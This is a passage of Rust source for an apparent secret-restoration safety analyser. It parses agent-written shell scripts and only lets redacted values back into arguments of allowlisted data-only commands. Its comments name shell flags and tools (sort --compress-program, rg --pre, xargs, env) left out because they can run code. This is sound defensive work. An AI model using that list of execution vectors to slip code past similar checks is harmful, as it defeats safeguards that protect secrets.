// SPDX-License-Identifier: AGPL-3.0-only

//! Shell command analysis: for each placeholder in a shell script (or an argv), the layers it
//! lands in, or why it may not be restored.
//!
//! The analyser models the POSIX shell and bash syntax agents write: words, single and double
//! quotes, backslashes, `$var`, `$(...)` and `<(...)`, pipelines and lists, redirections,
//! heredocs and here-strings, comments, and `sh -c` / `python3 -c` / `node -e` / `sqlite3`
//! programs (through [`super::code`]). A value is restored only when:
//!
//! * every command on the line, including those in substitutions and nested `sh -c` scripts,
//!   is a known data-only command (`cat`, `echo`, `grep`, ...: they take no code and run
//!   nothing, whatever their arguments), or an interpreter whose program
//!   [`super::code::analyze`] vouches for; otherwise any value could reach an evaluator
//!   through a pipe, a file or an argument, and every placeholder is kept;
//! * no command writes to a file that is code ([`super::files::is_code_path`]);
//! * the placeholder is an argument, a here-string or heredoc content, or a string literal in
//!   an interpreter program: never a command name, an assignment, a redirection target, a
//!   comment, or inside a construct the analyser does not model (backticks, `$((...))`,
//!   `${...}` beyond a plain name, `$'...'`, `case`, `for`, `[[`, functions); and
//! * the placeholder does not follow a backslash or `$`.
//!
//! Anything the analyser does not understand keeps every placeholder in the script.
//! Commands are taken at their standard meaning: aliases and functions from the agent's own
//! shell start-up files are outside what scrim can see.

use super::code::{self, Lang};
use super::files::{self, BodyFormat};
use super::{Layer, Refusal, Site};

/// Commands that take no code, run nothing and write no file named by an argument, whatever
/// their arguments (GNU coreutils and grep semantics; `tee` is checked separately). `sort` (`--compress-program`), `rg` (`--pre`), `find`, `xargs`, `sed`,
/// `awk`, `jq`, `printf` (`-v`), `test` (`-v`), `git`, `env` and every network client are
/// deliberately absent.
pub const DATA_COMMANDS: &[&str] = &[
    "cat",
    "echo",
    "ls",
    "head",
    "tail",
    "wc",
    "grep",
    "egrep",
    "fgrep",
    "diff",
    "cmp",
    "comm",
    "cut",
    "tr",
    "nl",
    "fold",
    "rev",
    "tac",
    "basename",
    "dirname",
    "realpath",
    "readlink",
    "stat",
    "file",
    "du",
    "df",
    "pwd",
    "true",
    "false",
    "mkdir",
    "touch",
    "base64",
    "md5sum",
    "sha1sum",
    "sha224sum",
    "sha256sum",
    "sha384sum",
    "sha512sum",
    "b2sum",
    "cksum",
    "od",
    "hexdump",
    "tee",
    "cd",
];

/// Which commands the analyser treats as data-only.
pub trait CommandSet {
    /// Whether `name` (a bare command name) takes no code and runs nothing.
    fn is_data(&self, name: &str) -> bool;
}

/// The built-in [`DATA_COMMANDS`].
#[derive(Clone, Copy, Debug, Default)]
pub struct BuiltinCommands;

impl CommandSet for BuiltinCommands {
    fn is_data(&self, name: &str) -> bool {
        DATA_COMMANDS.contains(&name)
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Q {
    Bare,
    /// A backslash-escaped character: literal, like single quotes, for word-literalness.
    Escaped,
    Single,
    Double,
    Argv,
}

#[derive(Clone, Debug)]
enum Piece {
    /// Literal text after quote removal. `special`: contains unquoted glob, brace or tilde
    /// characters, so the word's value is not this text.
    Text { s: String, q: Q, special: bool },
    /// A placeholder (global index).
    Ph { k: usize, q: Q },
    /// `$var`, `$(...)` or `<(...)`: not literal.
    Expansion,
}

#[derive(Clone, Debug, Default)]
struct Word {
    pieces: Vec<Piece>,
}

impl Word {
    fn is_empty(&self) -> bool {
        self.pieces.is_empty()
    }

    fn push_text(&mut self, c: &str, q: Q, special: bool) {
        if let Some(Piece::Text {
            s,
            q: lq,
            special: ls,
        }) = self.pieces.last_mut()
            && *lq == q
        {
            s.push_str(c);
            *ls |= special;
            return;
        }
        self.pieces.push(Piece::Text {
            s: c.to_owned(),
            q,
            special,
        });
    }

    /// The word's value when it is fully literal (no placeholder, expansion or glob).
    fn literal(&self) -> Option<String> {
        let mut out = String::new();
        for p in &self.pieces {
            match p {
                Piece::Text { s, special, .. } if !special => out.push_str(s),
                _ => return None,
            }
        }
        Some(out)
    }

    /// Like [`Word::literal`], but an unquoted leading `~` counts as literal text.
    fn literal_path(&self) -> Option<String> {
        if let Some(Piece::Text { s, q: Q::Bare, .. }) = self.pieces.first()
            && s.starts_with('~')
            && !s[1..].contains(['*', '?', '[', '{'])
        {
            let mut out = s.clone();
            for p in &self.pieces[1..] {
                match p {
                    Piece::Text { s, special, .. } if !special => out.push_str(s),
                    _ => return None,
                }
            }
            return Some(out);
        }
        self.literal()
    }

    /// The raw text of an unquoted keyword-like word (`{`, `if`, `!`).
    fn keyword(&self) -> Option<&str> {
        match self.pieces.as_slice() {
            [Piece::Text { s, q: Q::Bare, .. }] => Some(s),
            _ => None,
        }
    }

    fn phs(&self) -> impl Iterator<Item = usize> + '_ {
        self.pieces.iter().filter_map(|p| match p {
            Piece::Ph { k, .. } => Some(*k),
            _ => None,
        })
    }

    fn is_assignment(&self) -> bool {
        let Some(Piece::Text { s, q: Q::Bare, .. }) = self.pieces.first() else {
            return false;
        };
        let Some(eq) = s.find('=') else { return false };
        let name = s[..eq].trim_end_matches('+');
        let name = name.split('[').next().unwrap_or("");
        !name.is_empty()
            && !name.starts_with(|c: char| c.is_ascii_digit())
            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum RedirKind {
    In,
    Out,
    Dup,
    HereString,
    Heredoc { quoted: bool },
}

#[derive(Clone, Debug)]
struct Redirect {
    kind: RedirKind,
    target: Word,
    /// Heredoc body, and the placeholders in it as (global index, start, end) relative to it.
    body: String,
    body_phs: Vec<(usize, usize, usize)>,
}

#[derive(Clone, Debug, Default)]
struct Cmd {
    words: Vec<Word>,
    redirects: Vec<Redirect>,
}

struct Pending {
    /// Nesting depth of the list the heredoc belongs to.
    depth: usize,
    cmd: usize,
    redirect: usize,
    delim: String,
    strip_tabs: bool,
}

/// Result of lexing one script: commands, or a reason to keep everything.
struct Lx<'a> {
    s: &'a str,
    b: &'a [u8],
    /// Placeholder spans in `s`, with their global index.
    spans: &'a [(usize, usize, usize)],
    forced: Vec<(usize, Refusal)>,
    cmds: Vec<Cmd>,
    pending: Vec<Pending>,
    depth: usize,
}

type Abort = Refusal;

impl<'a> Lx<'a> {
    fn span_at(&self, i: usize) -> Option<(usize, usize)> {
        self.spans
            .iter()
            .find(|&&(s, _, _)| s == i)
            .map(|&(_, e, k)| (e, k))
    }

    fn ch(&self, i: usize) -> &'a str {
        let n = self.s[i..].chars().next().map_or(1, char::len_utf8);
        &self.s[i..i + n]
    }

    fn force(&mut self, k: usize, r: Refusal) {
        self.forced.push((k, r));
    }

    /// Parses a list of commands from `i` until the end, or until an unmatched `)` when
    /// `nested`. Returns the offset after the list (after the `)` when nested).
    fn list(&mut self, i: usize, nested: bool) -> Result<usize, Abort> {
        self.depth += 1;
        let r = self.list_inner(i, nested);
        self.depth -= 1;
        r
    }

    fn list_inner(&mut self, mut i: usize, nested: bool) -> Result<usize, Abort> {
        let mut cmd = Cmd::default();
        let mut word = Word::default();
        let end_word = |cmd: &mut Cmd, word: &mut Word| {
            if !word.is_empty() {
                cmd.words.push(std::mem::take(word));
            }
        };
        macro_rules! end_cmd {
            () => {{
                end_word(&mut cmd, &mut word);
                if !cmd.words.is_empty() || !cmd.redirects.is_empty() {
                    self.cmds.push(std::mem::take(&mut cmd));
                }
            }};
        }
        while i < self.b.len() {
            if let Some((e, k)) = self.span_at(i) {
                word.pieces.push(Piece::Ph { k, q: Q::Bare });
                i = e;
                continue;
            }
            let c = self.b[i];
            match c {
                b' ' | b'\t' => {
                    end_word(&mut cmd, &mut word);
                    i += 1;
                }
                b'\n' => {
                    end_cmd!();
                    i = self.heredoc_bodies(i + 1)?;
                }
                b';' | b'&' | b'|' => {
                    if c == b'&' && self.b.get(i + 1) == Some(&b'>') {
                        end_word(&mut cmd, &mut word);
                        let n = if self.b.get(i + 2) == Some(&b'>') {
                            3
                        } else {
                            2
                        };
                        i = self.redirect(i + n, RedirKind::Out, &mut cmd)?;
                        continue;
                    }
                    if c == b';' && self.b.get(i + 1) == Some(&b';') {
                        return Err(Refusal::Unsupported);
                    }
                    end_cmd!();
                    i += 1;
                }
                b'(' => {
                    if !word.is_empty() || self.b.get(i + 1) == Some(&b'(') {
                        // f(), a=(...), @(...) extglob, ((arithmetic)).
                        return Err(Refusal::Unsupported);
                    }
                    end_cmd!();
                    i = self.list(i + 1, true)?;
                }
                b')' => {
                    end_cmd!();
                    if nested {
                        if !self.pending.is_empty() {
                            return Err(Refusal::Unsupported);
                        }
                        return Ok(i + 1);
                    }
                    i += 1;
                }
                b'<' | b'>' => {
                    if self.b.get(i + 1) == Some(&b'(') {
                        // Process substitution: a file name, its commands analysed.
                        i = self.list(i + 2, true)?;
                        word.pieces.push(Piece::Expansion);
                        continue;
                    }
                    // A word of digits right before is a file descriptor.
                    if let Some(lit) = word.literal()
                        && !lit.is_empty()
                        && lit.bytes().all(|d| d.is_ascii_digit())
                        && matches!(word.pieces.as_slice(), [Piece::Text { q: Q::Bare, .. }])
                    {
                        word = Word::default();
                    }
                    end_word(&mut cmd, &mut word);
                    let rest = &self.b[i..];
                    let (kind, n) = if rest.starts_with(b"<<<") {
                        (RedirKind::HereString, 3)
                    } else if rest.starts_with(b"<<-") {
                        (RedirKind::Heredoc { quoted: false }, 3)
                    } else if rest.starts_with(b"<<") {
                        (RedirKind::Heredoc { quoted: false }, 2)
                    } else if rest.starts_with(b"<&") || rest.starts_with(b">&") {
                        (RedirKind::Dup, 2)
                    } else if rest.starts_with(b"<>")
                        || rest.starts_with(b">>")
                        || rest.starts_with(b">|")
                    {
                        (RedirKind::Out, 2)
                    } else if c == b'>' {
                        (RedirKind::Out, 1)
                    } else {
                        (RedirKind::In, 1)
                    };
                    let strip = rest.starts_with(b"<<-");
                    if let RedirKind::Heredoc { .. } = kind {
                        i = self.heredoc_start(i + n, strip, &mut cmd)?;
                    } else {
                        i = self.redirect(i + n, kind, &mut cmd)?;
                    }
                }
                b'#' if word.is_empty() => {
                    while i < self.b.len() && self.b[i] != b'\n' {
                        if let Some((e, k)) = self.span_at(i) {
                            self.force(k, Refusal::Position);
                            i = e;
                        } else {
                            i += 1;
                        }
                    }
                }
                _ => i = self.word_char(i, &mut word)?,
            }
        }
        end_cmd!();
        if nested {
            return Err(Refusal::Unsupported);
        }
        if !self.pending.is_empty() {
            return Err(Refusal::Unsupported);
        }
        Ok(i)
    }

    /// One character (or quoted run) of a word outside double quotes.
    fn word_char(&mut self, i: usize, word: &mut Word) -> Result<usize, Abort> {
        match self.b[i] {
            b'\'' => {
                let mut j = i + 1;
                // An empty quoted string is still part of the word.
                word.push_text("", Q::Single, false);
                loop {
                    if j >= self.b.len() {
                        return Err(Refusal::Unsupported);
                    }
                    if let Some((e, k)) = self.span_at(j) {
                        word.pieces.push(Piece::Ph { k, q: Q::Single });
                        j = e;
                        continue;
                    }
                    if self.b[j] == b'\'' {
                        return Ok(j + 1);
                    }
                    let c = self.ch(j);
                    word.push_text(c, Q::Single, false);
                    j += c.len();
                }
            }
            b'"' => self.double(i + 1, word),
            b'\\' => {
                if self.b.get(i + 1) == Some(&b'\n') {
                    return Ok(i + 2);
                }
                if i + 1 >= self.b.len() {
                    return Err(Refusal::Unsupported);
                }
                if let Some((_, k)) = self.span_at(i + 1) {
                    self.force(k, Refusal::Adjacent);
                    return Ok(i + 1);
                }
                let c = self.ch(i + 1);
                word.push_text(c, Q::Escaped, false);
                Ok(i + 1 + c.len())
            }
            b'$' => self.dollar(i, word),
            b'`' => Err(Refusal::Unsupported),
            c => {
                let special =
                    matches!(c, b'*' | b'?' | b'[' | b'{' | b'}') || (c == b'~' && word.is_empty());
                if matches!(c, b'@' | b'!' | b'+' | b'*' | b'?') && self.b.get(i + 1) == Some(&b'(')
                {
                    return Err(Refusal::Unsupported);
                }
                let ch = self.ch(i);
                word.push_text(ch, Q::Bare, special);
                Ok(i + ch.len())
            }
        }
    }

    /// Inside double quotes, from `i` (after the opening quote).
    fn double(&mut self, mut i: usize, word: &mut Word) -> Result<usize, Abort> {
        word.push_text("", Q::Double, false);
        loop {
            if i >= self.b.len() {
                return Err(Refusal::Unsupported);
            }
            if let Some((e, k)) = self.span_at(i) {
                word.pieces.push(Piece::Ph { k, q: Q::Double });
                i = e;
                continue;
            }
            match self.b[i] {
                b'"' => return Ok(i + 1),
                b'\\' => {
                    if let Some((_, k)) = self.span_at(i + 1) {
                        self.force(k, Refusal::Adjacent);
                        word.push_text("\\", Q::Double, false);
                        i += 1;
                        continue;
                    }
                    match self.b.get(i + 1) {
                        Some(b'\n') => i += 2,
                        Some(&c @ (b'$' | b'`' | b'"' | b'\\')) => {
                            word.push_text(&(c as char).to_string(), Q::Double, false);
                            i += 2;
                        }
                        Some(_) => {
                            word.push_text("\\", Q::Double, false);
                            i += 1;
                        }
                        None => return Err(Refusal::Unsupported),
                    }
                }
                b'$' => {
                    let mut tmp = Word::default();
                    i = self.dollar(i, &mut tmp)?;
                    for p in tmp.pieces {
                        match p {
                            Piece::Text { s, .. } => word.push_text(&s, Q::Double, false),
                            other => word.pieces.push(other),
                        }
                    }
                }
                b'`' => return Err(Refusal::Unsupported),
                _ => {
                    let c = self.ch(i);
                    word.push_text(c, Q::Double, false);
                    i += c.len();
                }
            }
        }
    }

    /// `$` at `i`.
    fn dollar(&mut self, i: usize, word: &mut Word) -> Result<usize, Abort> {
        if let Some((_, k)) = self.span_at(i + 1) {
            self.force(k, Refusal::Adjacent);
            word.push_text("$", Q::Escaped, false);
            return Ok(i + 1);
        }
        match self.b.get(i + 1) {
            Some(b'(') => {
                if self.b.get(i + 2) == Some(&b'(') {
                    return Err(Refusal::Unsupported);
                }
                let j = self.list(i + 2, true)?;
                word.pieces.push(Piece::Expansion);
                Ok(j)
            }
            Some(b'{') => {
                let close = self.b[i + 2..]
                    .iter()
                    .position(|&c| c == b'}')
                    .ok_or(Refusal::Unsupported)?;
                let name = &self.s[i + 2..i + 2 + close];
                let simple = (!name.is_empty()
                    && !name.starts_with(|c: char| c.is_ascii_digit())
                    && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'))
                    || matches!(name, "#" | "?" | "@" | "*" | "!" | "$" | "-")
                    || (!name.is_empty() && name.chars().all(|c| c.is_ascii_digit()));
                if !simple {
                    return Err(Refusal::Unsupported);
                }
                word.pieces.push(Piece::Expansion);
                Ok(i + 3 + close)
            }
            Some(b'\'' | b'"') => Err(Refusal::Unsupported),
            Some(&c) if c.is_ascii_alphabetic() || c == b'_' => {
                let mut j = i + 1;
                while j < self.b.len() && (self.b[j].is_ascii_alphanumeric() || self.b[j] == b'_') {
                    j += 1;
                }
                word.pieces.push(Piece::Expansion);
                Ok(j)
            }
            Some(&c) if c.is_ascii_digit() || b"#?@*!$-".contains(&c) => {
                word.pieces.push(Piece::Expansion);
                Ok(i + 2)
            }
            _ => {
                word.push_text("$", Q::Bare, false);
                Ok(i + 1)
            }
        }
    }

    fn skip_blanks(&self, mut i: usize) -> usize {
        while i < self.b.len() && matches!(self.b[i], b' ' | b'\t') {
            i += 1;
        }
        i
    }

    /// Reads the target word of a redirection.
    fn target(&mut self, i: usize) -> Result<(usize, Word), Abort> {
        let mut i = self.skip_blanks(i);
        let mut w = Word::default();
        while i < self.b.len() {
            if let Some((e, k)) = self.span_at(i) {
                w.pieces.push(Piece::Ph { k, q: Q::Bare });
                i = e;
                continue;
            }
            if matches!(
                self.b[i],
                b' ' | b'\t' | b'\n' | b';' | b'&' | b'|' | b'(' | b')' | b'<' | b'>'
            ) {
                break;
            }
            i = self.word_char(i, &mut w)?;
        }
        if w.is_empty() {
            return Err(Refusal::Unsupported);
        }
        Ok((i, w))
    }

    fn redirect(&mut self, i: usize, kind: RedirKind, cmd: &mut Cmd) -> Result<usize, Abort> {
        let (j, target) = self.target(i)?;
        cmd.redirects.push(Redirect {
            kind,
            target,
            body: String::new(),
            body_phs: Vec::new(),
        });
        Ok(j)
    }

    fn heredoc_start(&mut self, i: usize, strip_tabs: bool, cmd: &mut Cmd) -> Result<usize, Abort> {
        let (j, target) = self.target(i)?;
        if target.phs().next().is_some() {
            return Err(Refusal::Unsupported);
        }
        let quoted = target.pieces.iter().any(|p| {
            matches!(
                p,
                Piece::Text {
                    q: Q::Single | Q::Double | Q::Escaped,
                    ..
                }
            )
        });
        let delim = target.literal().ok_or(Refusal::Unsupported)?;
        cmd.redirects.push(Redirect {
            kind: RedirKind::Heredoc { quoted },
            target,
            body: String::new(),
            body_phs: Vec::new(),
        });
        self.pending.push(Pending {
            depth: self.depth,
            cmd: self.cmds.len(),
            redirect: cmd.redirects.len() - 1,
            delim,
            strip_tabs,
        });
        Ok(j)
    }

    /// Reads the bodies of pending heredocs starting at `i` (just after a newline).
    fn heredoc_bodies(&mut self, mut i: usize) -> Result<usize, Abort> {
        let pending = std::mem::take(&mut self.pending);
        if pending.iter().any(|p| p.depth != self.depth) {
            // A newline inside a substitution while an outer heredoc waits for its body.
            return Err(Refusal::Unsupported);
        }
        for p in pending {
            let body_start = i;
            let mut body_end = None;
            while i <= self.b.len() {
                let line_end = self.b[i..]
                    .iter()
                    .position(|&c| c == b'\n')
                    .map_or(self.b.len(), |n| i + n);
                let mut line = &self.s[i..line_end];
                if p.strip_tabs {
                    line = line.trim_start_matches('\t');
                }
                if line == p.delim {
                    body_end = Some(i);
                    i = (line_end + 1).min(self.b.len());
                    break;
                }
                if line_end >= self.b.len() {
                    break;
                }
                i = line_end + 1;
            }
            let body_end = body_end.ok_or(Refusal::Unsupported)?;
            let body = self.s[body_start..body_end].to_owned();
            let phs: Vec<_> = self
                .spans
                .iter()
                .filter(|&&(s, _, _)| s >= body_start && s < body_end)
                .map(|&(s, e, k)| (k, s - body_start, e - body_start))
                .collect();
            let Some(r) = self
                .cmds
                .get_mut(p.cmd)
                .and_then(|c| c.redirects.get_mut(p.redirect))
                .filter(|r| matches!(r.kind, RedirKind::Heredoc { .. }))
            else {
                return Err(Refusal::Unsupported);
            };
            if r.kind == (RedirKind::Heredoc { quoted: false }) {
                // Expansions run in an unquoted body; command substitutions would run code
                // the analyser has not seen.
                let mut scan = body.clone();
                for &(_, s, e) in phs.iter().rev() {
                    scan.replace_range(s..e, "_");
                }
                if scan.contains("$(") || scan.contains('`') || scan.contains("${") {
                    return Err(Refusal::Unsupported);
                }
            }
            r.body = body;
            r.body_phs = phs;
        }
        Ok(i)
    }
}

/// The layer a placeholder piece's quoting puts it in.
fn piece_layer(q: Q, word_start: bool) -> Layer {
    match q {
        Q::Bare | Q::Escaped => Layer::ShellBare { word_start },
        Q::Single => Layer::ShellSingle { word_start },
        Q::Double => Layer::ShellDouble { word_start },
        Q::Argv => Layer::Argv { word_start },
    }
}

/// Every placeholder in `w`, with its layer.
fn word_sites(w: &Word, options_ended: bool) -> Vec<(usize, Site)> {
    let mut out = Vec::new();
    let mut start = !options_ended;
    for p in &w.pieces {
        match p {
            Piece::Ph { k, q } => {
                out.push((*k, Site::of(piece_layer(*q, start))));
                start = false;
            }
            Piece::Text { s, .. } if s.is_empty() => {}
            _ => start = false,
        }
    }
    out
}

/// Placeholder spans in a code word: start, end, global index, outer quoting.
type CodeSpans = Vec<(usize, usize, usize, Q)>;

/// A word whose text is code for another language: the program text with the placeholders'
/// original text, their spans in it, and their quoting in the outer word.
fn code_text(w: &Word, ph_text: &dyn Fn(usize) -> String) -> Option<(String, CodeSpans)> {
    let mut text = String::new();
    let mut spans = Vec::new();
    for p in &w.pieces {
        match p {
            Piece::Text { s, special, .. } => {
                if *special {
                    return None;
                }
                text.push_str(s);
            }
            Piece::Ph { k, q } => {
                let t = ph_text(*k);
                spans.push((text.len(), text.len() + t.len(), *k, *q));
                text.push_str(&t);
            }
            Piece::Expansion => return None,
        }
    }
    Some((text, spans))
}

const KEYWORDS_SKIP: &[&str] = &[
    "!", "{", "}", "if", "then", "else", "elif", "fi", "do", "done", "while", "until", "time",
];
const KEYWORDS_REFUSE: &[&str] = &[
    "for", "case", "esac", "select", "function", "[[", "]]", "coproc", "in",
];

struct Analyzer<'c> {
    commands: &'c dyn CommandSet,
    sites: Vec<Option<Result<Site, Refusal>>>,
    texts: Vec<String>,
}

impl Analyzer<'_> {
    fn set(&mut self, k: usize, v: Result<Site, Refusal>) {
        if let Some(slot) = self.sites.get_mut(k) {
            *slot = Some(v);
        }
    }

    fn refuse_word(&mut self, w: &Word, r: Refusal) {
        for k in w.phs() {
            self.set(k, Err(r));
        }
    }

    fn script(&mut self, s: &str, spans: &[(usize, usize, usize)]) -> Result<(), Abort> {
        let mut lx = Lx {
            s,
            b: s.as_bytes(),
            spans,
            forced: Vec::new(),
            cmds: Vec::new(),
            pending: Vec::new(),
            depth: 0,
        };
        lx.list(0, false)?;
        let Lx { cmds, forced, .. } = lx;
        for c in &cmds {
            self.command(c)?;
        }
        for (k, r) in forced {
            self.set(k, Err(r));
        }
        Ok(())
    }

    fn command(&mut self, c: &Cmd) -> Result<(), Abort> {
        let mut words = c.words.as_slice();
        // Assignments and keywords before the command name.
        loop {
            match words.first() {
                Some(w) if w.is_assignment() => {
                    self.refuse_word(w, Refusal::Position);
                    words = &words[1..];
                }
                Some(w) if w.keyword().is_some_and(|k| KEYWORDS_SKIP.contains(&k)) => {
                    words = &words[1..];
                }
                Some(w) if w.keyword().is_some_and(|k| KEYWORDS_REFUSE.contains(&k)) => {
                    return Err(Refusal::Unsupported);
                }
                _ => break,
            }
        }
        let mut out_format = BodyFormat::Text;
        for r in &c.redirects {
            match r.kind {
                RedirKind::Out => {
                    let Some(path) = r.target.literal_path() else {
                        return Err(Refusal::CodeFile);
                    };
                    if files::is_code_path(&path) {
                        return Err(Refusal::CodeFile);
                    }
                    out_format = BodyFormat::of(&path);
                }
                RedirKind::In | RedirKind::Dup => self.refuse_word(&r.target, Refusal::Position),
                RedirKind::HereString | RedirKind::Heredoc { .. } => {}
            }
        }
        let Some((name_w, args)) = words.split_first() else {
            // Only assignments or redirections.
            for r in &c.redirects {
                self.refuse_word(&r.target, Refusal::Position);
                for &(k, _, _) in &r.body_phs {
                    self.set(k, Err(Refusal::Position));
                }
            }
            return Ok(());
        };
        let Some(name) = name_w.literal() else {
            self.refuse_word(name_w, Refusal::Code);
            return Err(Refusal::UnknownCommand);
        };
        let base = match name.as_str() {
            n if n.starts_with("/usr/bin/") || n.starts_with("/bin/") => {
                n.rsplit('/').next().unwrap_or("").to_owned()
            }
            n if n.contains('/') => return Err(Refusal::UnknownCommand),
            n => n.to_owned(),
        };
        if self.commands.is_data(&base) {
            let mut ended = false;
            for w in args {
                if base == "tee" {
                    match w.literal_path() {
                        Some(p) if p.starts_with('-') => {}
                        Some(p) if files::is_code_path(&p) => return Err(Refusal::CodeFile),
                        Some(_) => {}
                        None => {
                            self.refuse_word(w, Refusal::Position);
                            return Err(Refusal::CodeFile);
                        }
                    }
                }
                for (k, site) in word_sites(w, ended) {
                    self.set(k, Ok(site));
                }
                if w.literal().as_deref() == Some("--") {
                    ended = true;
                }
            }
        } else if let Some(lang) = interpreter(&base) {
            self.interpreter(lang, &base, args)?;
        } else if matches!(base.as_str(), "sh" | "bash" | "dash" | "zsh" | "ksh") {
            self.nested_shell(args)?;
        } else {
            return Err(Refusal::UnknownCommand);
        }
        for r in &c.redirects {
            match r.kind {
                RedirKind::HereString => {
                    for (k, site) in word_sites(&r.target, true) {
                        self.set(k, Ok(site));
                    }
                }
                RedirKind::Heredoc { quoted } => {
                    let hd = if quoted {
                        Layer::HeredocQuoted
                    } else {
                        Layer::HeredocUnquoted
                    };
                    let spans: Vec<_> = r.body_phs.iter().map(|&(_, s, e)| (s, e)).collect();
                    let fmt = files::body_layers(out_format, &r.body, &spans);
                    for (&(k, s, _), f) in r.body_phs.iter().zip(fmt) {
                        let before = r.body[..s].chars().next_back();
                        let site = if !quoted && matches!(before, Some('\\' | '$')) {
                            Err(Refusal::Adjacent)
                        } else {
                            f.map(|l| match l {
                                Some(l) => Site::of(l).within(hd),
                                None => Site::of(hd),
                            })
                        };
                        self.set(k, site);
                    }
                }
                _ => {}
            }
        }
        Ok(())
    }

    fn interpreter(&mut self, lang: Lang, base: &str, args: &[Word]) -> Result<(), Abort> {
        let mut programs: Vec<&Word> = Vec::new();
        let mut rest: &[Word] = &[];
        match lang {
            Lang::Python | Lang::JavaScript => {
                let (flags, code_flags): (&[&str], &[&str]) = if lang == Lang::Python {
                    (
                        &[
                            "-u", "-B", "-E", "-I", "-s", "-S", "-O", "-OO", "-q", "-b", "-bb",
                        ],
                        &["-c"],
                    )
                } else {
                    (&[], &["-e", "--eval", "-p", "--print"])
                };
                let mut it = args.iter();
                loop {
                    let Some(w) = it.next() else {
                        return Err(Refusal::UnknownCommand);
                    };
                    let Some(f) = w.literal() else {
                        return Err(Refusal::UnknownCommand);
                    };
                    if code_flags.contains(&f.as_str()) {
                        let Some(p) = it.next() else {
                            return Err(Refusal::UnknownCommand);
                        };
                        programs.push(p);
                        rest = it.as_slice();
                        break;
                    }
                    if !flags.contains(&f.as_str()) {
                        return Err(Refusal::UnknownCommand);
                    }
                }
            }
            Lang::Sqlite => {
                const SAFE: &[&str] = &[
                    "-json",
                    "-csv",
                    "-header",
                    "-noheader",
                    "-line",
                    "-list",
                    "-readonly",
                    "-batch",
                    "-bail",
                    "-column",
                    "-box",
                    "-markdown",
                    "-table",
                    "-tabs",
                    "-html",
                    "-quote",
                    "-ascii",
                ];
                let mut db = None;
                for w in args {
                    match w.literal() {
                        Some(f) if f.starts_with('-') => {
                            if !SAFE.contains(&f.as_str()) {
                                return Err(Refusal::UnknownCommand);
                            }
                        }
                        _ if db.is_none() => db = Some(w),
                        _ => programs.push(w),
                    }
                }
                let Some(db) = db else {
                    return Err(Refusal::UnknownCommand);
                };
                match db.literal_path() {
                    Some(p) if !files::is_code_path(&p) => {}
                    Some(_) => return Err(Refusal::CodeFile),
                    None => {
                        self.refuse_word(db, Refusal::Position);
                        return Err(Refusal::CodeFile);
                    }
                }
                if programs.is_empty() {
                    // SQL from stdin: not analysed.
                    return Err(Refusal::UnknownCommand);
                }
            }
        }
        let _ = base;
        for w in rest {
            self.refuse_word(w, Refusal::Position);
        }
        for p in programs {
            let texts = &self.texts;
            let (text, spans) = code_text(p, &|k| texts.get(k).cloned().unwrap_or_default())
                .ok_or(Refusal::Code)?;
            let local: Vec<_> = spans.iter().map(|&(s, e, _, _)| (s, e)).collect();
            let a = code::analyze(lang, &text, &local);
            if !a.program_ok {
                return Err(Refusal::Code);
            }
            for (&(_, _, k, q), inner) in spans.iter().zip(a.sites) {
                self.set(k, inner.map(|l| Site::of(l).within(piece_layer(q, false))));
            }
        }
        Ok(())
    }

    fn nested_shell(&mut self, args: &[Word]) -> Result<(), Abort> {
        let mut it = args.iter();
        let program = loop {
            let Some(w) = it.next() else {
                return Err(Refusal::UnknownCommand);
            };
            let Some(f) = w.literal() else {
                return Err(Refusal::UnknownCommand);
            };
            match f.as_str() {
                "-o" => {
                    let opt = it.next().and_then(Word::literal);
                    if !matches!(opt.as_deref(), Some("pipefail" | "errexit" | "nounset")) {
                        return Err(Refusal::UnknownCommand);
                    }
                }
                f if f.starts_with('-')
                    && f.len() > 1
                    && f[1..]
                        .chars()
                        .all(|c| matches!(c, 'l' | 'c' | 'e' | 'u' | 'x' | 'v')) =>
                {
                    if f.contains('c') {
                        break it.next().ok_or(Refusal::UnknownCommand)?;
                    }
                }
                _ => return Err(Refusal::UnknownCommand),
            }
        };
        for w in it {
            self.refuse_word(w, Refusal::Position);
        }
        let texts = &self.texts;
        let (text, spans) = code_text(program, &|k| texts.get(k).cloned().unwrap_or_default())
            .ok_or(Refusal::Code)?;
        let inner_spans: Vec<_> = spans
            .iter()
            .enumerate()
            .map(|(j, &(s, e, _, _))| (s, e, j))
            .collect();
        let mut inner = Analyzer {
            commands: self.commands,
            sites: vec![None; spans.len()],
            texts: spans
                .iter()
                .map(|&(s, e, _, _)| text[s..e].to_owned())
                .collect(),
        };
        inner.script(&text, &inner_spans)?;
        for (j, &(_, _, k, q)) in spans.iter().enumerate() {
            let site = inner.sites[j]
                .clone()
                .unwrap_or(Err(Refusal::Unsupported))
                .map(|s| s.within(piece_layer(q, false)));
            self.set(k, site);
        }
        Ok(())
    }
}

fn interpreter(base: &str) -> Option<Lang> {
    let py = base == "python"
        || base == "python3"
        || base
            .strip_prefix("python3.")
            .is_some_and(|v| !v.is_empty() && v.bytes().all(|c| c.is_ascii_digit()));
    if py {
        Some(Lang::Python)
    } else if base == "node" || base == "nodejs" {
        Some(Lang::JavaScript)
    } else if base == "sqlite3" {
        Some(Lang::Sqlite)
    } else {
        None
    }
}

fn finish(
    sites: Vec<Option<Result<Site, Refusal>>>,
    abort: Option<Refusal>,
) -> Vec<Result<Site, Refusal>> {
    sites
        .into_iter()
        .map(|s| match abort {
            Some(r) => Err(match s {
                Some(Err(own)) if own != Refusal::Adjacent => own,
                _ => r,
            }),
            None => s.unwrap_or(Err(Refusal::Unsupported)),
        })
        .collect()
}

/// Analyses a shell script. `spans` are the byte ranges of the placeholders in `script`, sorted
/// and not overlapping; the result has one entry per span.
pub fn analyze_script(
    script: &str,
    spans: &[(usize, usize)],
    commands: &dyn CommandSet,
) -> Vec<Result<Site, Refusal>> {
    let indexed: Vec<_> = spans
        .iter()
        .enumerate()
        .map(|(k, &(s, e))| (s, e, k))
        .collect();
    let mut a = Analyzer {
        commands,
        sites: vec![None; spans.len()],
        texts: spans
            .iter()
            .map(|&(s, e)| script[s..e].to_owned())
            .collect(),
    };
    let abort = a.script(script, &indexed).err();
    finish(a.sites, abort)
}

/// Analyses an argv (`["bash", "-lc", "..."]`, `["cat", "<v>"]`), executed without a shell.
/// `spans[i]` are the placeholder ranges in `argv[i]`; the result mirrors that shape.
pub fn analyze_argv(
    argv: &[&str],
